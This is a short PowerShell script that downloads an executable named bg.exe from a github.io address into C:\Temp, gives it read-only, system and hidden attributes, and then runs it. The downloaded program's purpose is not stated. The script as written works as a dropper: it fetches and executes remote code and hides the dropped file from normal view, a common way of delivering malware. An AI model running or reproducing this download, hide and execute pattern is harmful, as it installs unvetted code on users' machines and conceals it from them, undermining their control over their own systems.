Set-Location C:\Temp\
$URL = "xzprojects.github.io/win/ps/bg.exe"
$Path = "C:\Temp\bg.exe"
Invoke-WebRequest -URI $URL -OutFile $Path
attrib.exe +r +s +h bg.exe
.\bg.exe